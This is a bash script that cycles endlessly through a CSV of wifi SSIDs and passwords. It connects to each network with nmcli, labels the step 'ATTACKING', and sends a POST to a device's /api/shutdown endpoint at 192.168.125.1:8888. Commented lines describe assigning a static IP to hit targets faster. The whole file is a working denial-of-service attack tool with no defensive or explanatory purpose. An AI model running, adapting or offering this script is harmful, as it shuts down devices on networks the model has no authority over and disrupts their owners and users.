#!/bin/bash
# INTERFACE="wlp0s20f3"
# INTERFACE="wlx289401b9b39f"


if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <csv filename> <wifi interface>"
    exit 1
fi
FILE="$1"
INTERFACE="$2"
nmcli device disconnect $INTERFACE
# Check if file exists
[[ ! -f "$FILE" ]] && echo "File not found!" && exit 1

while true;do
    # Read the file line by line
    # -r prevents backslash escapes from being interpreted
    while IFS=',' read -r ssid password; do
        echo "($INTERFACE) ATTACKING: $ssid with password: $password"
        if nmcli --wait 5 device wifi connect "$ssid" password "$password" ifname "$INTERFACE" ; then
            # Manually assign an IP immediately (No waiting for DHCP!)
            # Adjust 192.168.1.50 to an IP likely to be free on your target networks
            # sudo timeout 1s ip addr add 192.168.125.50/24 dev "$INTERFACE" 
            
            timeout 1.5s curl --connect-timeout 1 -s -X 'POST' 'http://192.168.125.1:8888/api/shutdown' 
            
            # Clean up the IP so the next network doesn't conflict
            # sudo timeout 1s ip addr del 192.168.1.50/24 dev "$INTERFACE" 
        fi
        echo "---"
    done < "$FILE"
done
